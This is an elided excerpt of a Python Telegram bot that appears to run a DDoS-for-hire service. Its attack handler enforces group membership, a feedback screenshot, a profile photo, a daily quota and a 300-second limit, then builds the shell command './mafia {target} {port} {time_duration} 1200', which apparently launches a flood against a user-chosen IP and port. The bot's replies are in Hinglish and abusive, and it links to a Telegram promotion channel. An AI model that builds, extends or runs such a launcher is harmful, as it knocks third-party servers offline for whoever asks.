...
GROUP_ID = "-1002617516708"
CHANNEL_USERNAME = "@sourav_232"
...
def handle_attack(message):
    ...
    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f"🚫 ABE PAGAL PAHLE GROUP JOIN KAR BE❌\n🔗 GROUP 𝐉𝐨𝐢𝐧 KAR: {CHANNEL_USERNAME}")
        return
    ...
    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 **CHUTIYA!** 🔥\n🚀 *FEEDBACK NAHI DIYA 🤬🤬 PAHLE FEEDBACK DE PHIR ATTACK KAR PAYEGA!*")
        return

    # Check if an attack is already running
    if is_attack_running(user_id):
        bot.reply_to(message, "⚠️ **𝐑𝐔𝐊 𝐁𝐄 𝐁𝐇𝐀𝐈, 𝐄𝐊 ATTACK 𝐂𝐇𝐀𝐋 𝐑𝐇𝐀 𝐇𝐀𝐈!** ⚡")
        return
    ...
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"❌ **ATTACK 𝐋𝐈𝐌𝐈𝐓 𝐎𝐕𝐄𝐑!** ❌\n🔄 *𝐓𝐑𝐘 𝐀𝐆𝐀𝐈𝐍 𝐓𝐎𝐌𝐎𝐑𝐑𝐎𝐖!*")
        return
    ...
    if time_duration > 300:
        bot.reply_to(message, "🚫 **300 SECOND KARNA HAI KAR NHI TO LIKAL CHUTIYE !**")
        return
    ...
    if profile_photos.total_count > 0:
        ...
        bot.reply_to(message, "❌ **𝐓𝐎𝐃𝐀𝐘 𝐁𝐇𝐀𝐈, 𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐏𝐈𝐂 𝐃𝐀𝐋𝐈𝐍𝐄!** 🔥\n📸 * PHLE PROFILE PIC LAGAO FIR YAHA AAO !*")
        return
    ...
    full_command = f"./mafia {target} {port} {time_duration} 1200"
...
def send_attack_finished(message, user_name, target, port, time_duration, remaining_attacks):
    ...
    bot.send_message(message.chat.id, "🚀 **𝐍𝐄𝐗𝐓 ATTACK 𝐑𝐄𝐀𝐃𝐘!** ⚡")
...
def handle_screenshot(message):
    ...
    if pending_feedback.get(user_id, False):
        ...
        bot.reply_to(message, "✅ **𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐀𝐂𝐂𝐄𝐏𝐓𝐄𝐃! 𝐍𝐄𝐗𝐓 ATTACK  𝐑𝐄𝐀𝐃𝐘!** 🚀")
    else:
...
👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/sourav_232) 🚀🔥"""
